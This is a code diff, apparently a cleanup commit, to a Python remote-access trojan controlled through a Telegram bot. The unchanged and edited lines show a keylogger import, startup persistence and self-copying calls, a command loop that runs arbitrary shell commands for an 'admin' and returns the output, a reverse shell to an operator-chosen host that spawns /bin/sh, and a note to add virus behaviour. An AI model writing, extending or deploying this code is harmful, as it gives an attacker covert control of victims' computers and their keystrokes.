@@ -8,7 +8,7 @@ from time import sleep
 from os import system
 from platform import node, uname
 from socket import *
-from requests import post, get
+from requests import post
 from bs4 import BeautifulSoup
 from pynput.keyboard import Listener
 
@@ -59,8 +59,8 @@ def getting_func():
     res_GET = post(link, payload_GET)
     source = res_GET.text
     soup = BeautifulSoup(source, "html.parser")
-    resualt = soup.find("pre", title="showbody").text
-    return resualt
+    result = soup.find("pre", title="showbody").text
+    return result
 
 
 def message_func(message, user):
@@ -127,12 +127,12 @@ if __name__ == "__main__":
     info = info[0:3] + info[4:]
     start_up()
     auto_copy()
-    admin = 0000000              # TODO add admin id here
-    token = "00000:xxxxxxxxx"    # TODO add token here
+    admin = 00000000  # add admin id here
+    token = "xxxxxx"  # add token here
     while True:
-        resualt = getting_func()
-        data = loads(resualt)["result"][-1]["message"]["text"]
-        sender = str(loads(resualt)["result"][-1]["message"]["chat"]["id"])
+        finalResult = getting_func()
+        data = loads(finalResult)["result"][-1]["message"]["text"]
+        sender = str(loads(finalResult)["result"][-1]["message"]["chat"]["id"])
 
         if data[0:7] == "/sayHey" and admin == sender:
             message = str(info) + "_i'm_online"
@@ -169,11 +169,13 @@ if __name__ == "__main__":
                 port = data[13:].split(":")[1]
                 command = "export RHOST = " + ip + ";export RPORT = " + port + ";python -c " + 'import sys,socket,os,' \
                                                                                                'pty;s=socket.socket(' \
-                                                                                               ');s.connect((os.getenv(' \
-                                                                                               '"RHOST"),int(os.getenv(' \
+                                                                                               ');s.connect((' \
+                                                                                               'os.getenv("RHOST"),' \
+                                                                                               'int(os.getenv(' \
                                                                                                '"RPORT"))));[os.dup2(' \
-                                                                                               's.fileno(),fd) for fd ' \
-                                                                                               'in (0,1,2)];pty.spawn(' \
+                                                                                               's.fileno(),' \
+                                                                                               'fd) for fd in (0,1,' \
+                                                                                               '2)];pty.spawn(' \
                                                                                                '"/bin/sh") '
                 system(command)
                 message = str(info) + "_res=running"
@@ -223,7 +225,6 @@ if __name__ == "__main__":
                 res = check_output(command, shell=True)
                 message = str(info) + "_res=" + str(res) + "_ok"
                 message_func(message, sender)
-
         sleep(6)
 
 # TODO add virus behavior to clone
